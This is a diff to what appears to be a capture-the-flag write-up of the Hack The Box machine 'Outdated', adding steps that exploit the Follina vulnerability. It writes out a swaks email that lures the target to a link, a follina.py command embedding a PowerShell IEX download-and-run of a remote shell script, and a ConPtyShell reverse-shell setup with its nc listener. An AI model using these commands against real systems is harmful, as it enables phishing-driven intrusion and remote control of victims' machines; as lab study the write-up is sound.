@@ -274,6 +274,44 @@ At this point I am clueless how to proceed further but then I took some help fro
 
 ![image](https://user-images.githubusercontent.com/87700008/208659001-aa361b97-6774-46ad-ac94-272914a3defa.png)
 
-So, we can use swaks to send an e-mail towards itsupport & we can check for the response while our http server running, so the format to send e-mail to swaks will be something like this :
+So, we can use swaks to send an e-mail towards itsupport & we can check for the response while our ncat server running, so the format to send e-mail from swaks will be something like this :
 
         swaks --to itsupport@outdated.htb --from "k4rim@0k4rim.htb" --server mail.outdated.htb --header "Subject: Internal web app" --body "http://myip"
+        
+ And in our ncat we got response from the box & it seems like the server is running the powershell :
+ 
+ ![image](https://user-images.githubusercontent.com/87700008/208740200-2e609767-0c5a-4f7b-9f65-eb8d1c248e32.png)
+ 
+ Now, to exploit the follina vulnerability we can follow these steps :
+ 
+ - Host a html page with more than 4096 bytes to exploit the follina vulnerability.
+ - In that html page contain another "IEX" command to retrieve our shell which is beign hosted in the same directory.
+ - shell contains a code which will give us a reverse shell.
+
+So, to for the exploitation with 4096 bytes of padded data I used POC from here : https://github.com/chvancooten/follina.py
+With the help of follina.py I generated an HTML page with the exploit that well get executed on the box :
+
+        python3 follina.py -m command -t rtf -c "IEX(New-Object Net.WebClient).downloadString('http://myip/shell.ps1')"
+
+![image](https://user-images.githubusercontent.com/87700008/208747329-5db475c3-18f3-476a-8f8d-2ee73f317a7e.png)
+
+This generated an HTML page contains another url with my payload, look like this :
+![image](https://user-images.githubusercontent.com/87700008/208747624-f94eda45-de6e-4132-bf61-3a4cecee937a.png)
+
+To get a stable reverse shell I used this ps1 script : https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
+Copied the script & pasted into a new file "shell.ps1" & as per the repository to establish the shell I added this line at the end of script:
+
+        Invoke-ConPtyShell myIp port
+        
+![image](https://user-images.githubusercontent.com/87700008/208748561-2d8fb37b-29e0-4e40-b99c-ce64926116cf.png)
+
+And after that in the other terminal window I ran this to catch the stablize shell :
+
+        stty raw -echo; (stty size; cat) | nc -lvnp port
+        
+Then using swaks I again send the e-mail to the server pointing to the "/exploit.html" this time & got the reverse shell as user "btables".
+
+        swaks --to itsupport@outdated.htb --from "k4rim@0k4rim.com" --server mail.outdated.htb --header "Subject: Internal web app" --body "http://myip/exploit.html"
+        
+![image](https://user-images.githubusercontent.com/87700008/208749146-8a21362a-2e59-4d00-8fc8-dcd07f03e9ae.png)
+![image](https://user-images.githubusercontent.com/87700008/208749360-0faa1627-c25d-487f-81da-38b4a195ef1b.png)
